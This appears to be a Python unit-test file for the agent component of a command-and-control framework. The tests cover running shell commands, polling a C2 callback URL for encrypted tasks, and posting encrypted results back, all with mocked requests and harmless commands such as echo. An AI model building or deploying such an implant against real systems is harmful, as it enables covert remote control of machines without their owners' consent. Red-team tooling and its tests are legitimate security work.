#!/usr/bin/env python3
"""
Unit tests for agent module.
"""

import unittest
import json
import tempfile
import os
import subprocess
import requests
from unittest.mock import patch, MagicMock

from agent import execute_command, make_callback_request, send_response
from config_manager import generate_sample_config
from crypto_utils import generate_keypair, encrypt_message, encode_key_b64


class TestAgent(unittest.TestCase):
    
    def setUp(self) -> None:
        """Set up test fixtures."""
        self.agent_priv, self.agent_pub = generate_keypair()
        self.c2_priv, self.c2_pub = generate_keypair()
    
    def test_execute_command_simple(self) -> None:
        """Test simple command execution."""
        result = execute_command("echo hello")
        self.assertEqual(result, "hello")
    
    def test_execute_command_with_args(self) -> None:
        """Test command execution with arguments."""
        result = execute_command("echo 'hello world'")
        self.assertEqual(result, "hello world")
    
    def test_execute_command_error(self) -> None:
        """Test command execution error handling."""
        result = execute_command("invalidcommandthatdoesnotexist")
        self.assertIn("Return code:", result)
    
    def test_execute_command_timeout(self) -> None:
        """Test command timeout handling."""
        with patch('subprocess.run') as mock_run:
            mock_run.side_effect = subprocess.TimeoutExpired("cmd", 30)
            result = execute_command("sleep 60")
            self.assertIn("timed out", result)
    
    @patch('requests.get')
    def test_make_callback_request_success(self, mock_get: MagicMock) -> None:
        """Test successful callback request."""
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.text = "encrypted_task_data"
        mock_get.return_value = mock_response
        
        result = make_callback_request("http://test.com/callback", "deploy123")
        
        self.assertEqual(result, "encrypted_task_data")
        mock_get.assert_called_once_with(
            "http://test.com/callback",
            params={"deploy_id": "deploy123"},
            timeout=10
        )
    
    @patch('requests.get')
    def test_make_callback_request_no_tasks(self, mock_get: MagicMock) -> None:
        """Test callback request with no tasks (204 status)."""
        mock_response = MagicMock()
        mock_response.status_code = 204
        mock_get.return_value = mock_response
        
        result = make_callback_request("http://test.com/callback", "deploy123")
        
        self.assertIsNone(result)
    
    @patch('requests.get')
    def test_make_callback_request_error(self, mock_get: MagicMock) -> None:
        """Test callback request error handling."""
        mock_get.side_effect = requests.RequestException("Connection failed")
        
        result = make_callback_request("http://test.com/callback", "deploy123")
        
        self.assertIsNone(result)
    
    @patch('requests.post')
    def test_send_response_success(self, mock_post: MagicMock) -> None:
        """Test successful response sending."""
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_post.return_value = mock_response
        
        response_data = {
            "task_id": "test123",
            "task_num": "0",
            "task_result": "hello"
        }
        
        result = send_response(
            "http://test.com/callback",
            response_data,
            self.c2_pub,
            self.agent_priv
        )
        
        self.assertTrue(result)
        mock_post.assert_called_once()
    
    @patch('requests.post')
    def test_send_response_error(self, mock_post: MagicMock) -> None:
        """Test response sending error handling."""
        mock_post.side_effect = requests.RequestException("Connection failed")
        
        response_data = {
            "task_id": "test123",
            "task_num": "0", 
            "task_result": "hello"
        }
        
        result = send_response(
            "http://test.com/callback",
            response_data,
            self.c2_pub,
            self.agent_priv
        )
        
        self.assertFalse(result)
    
    def test_config_integration(self) -> None:
        """Test configuration integration with agent."""
        # Generate sample config
        config_data = generate_sample_config(self.c2_pub, self.agent_priv, self.agent_pub)
        
        # Save to temporary file
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(config_data)
            config_file = f.name
        
        try:
            # Test that config can be loaded
            with open(config_file, 'rb') as f:
                loaded_config = f.read()
            
            self.assertEqual(len(loaded_config), 528)
            self.assertEqual(loaded_config, config_data)
            
        finally:
            os.unlink(config_file)


class TestAgentIntegration(unittest.TestCase):
    """Integration tests for agent functionality."""
    
    def setUp(self) -> None:
        """Set up test fixtures."""
        self.agent_priv, self.agent_pub = generate_keypair()
        self.c2_priv, self.c2_pub = generate_keypair()
    
    def test_task_encryption_decryption(self) -> None:
        """Test task encryption and decryption flow."""
        # Create a task (what C2 would send)
        task = {
            "task_id": "test123",
            "task_num": "0",
            "task_arg": "echo hello"
        }
        task_json = json.dumps(task)
        
        # Encrypt task (C2 encrypts for agent)
        encrypted_task = encrypt_message(task_json, self.agent_pub, self.c2_priv)
        
        # Agent would decrypt the task
        from crypto_utils import decrypt_message
        decrypted_task = decrypt_message(encrypted_task, self.c2_pub, self.agent_priv)
        
        self.assertEqual(decrypted_task, task_json)
        
        # Parse and verify task structure
        parsed_task = json.loads(decrypted_task)
        self.assertEqual(parsed_task["task_id"], "test123")
        self.assertEqual(parsed_task["task_num"], "0")
        self.assertEqual(parsed_task["task_arg"], "echo hello")


if __name__ == '__main__':
    unittest.main()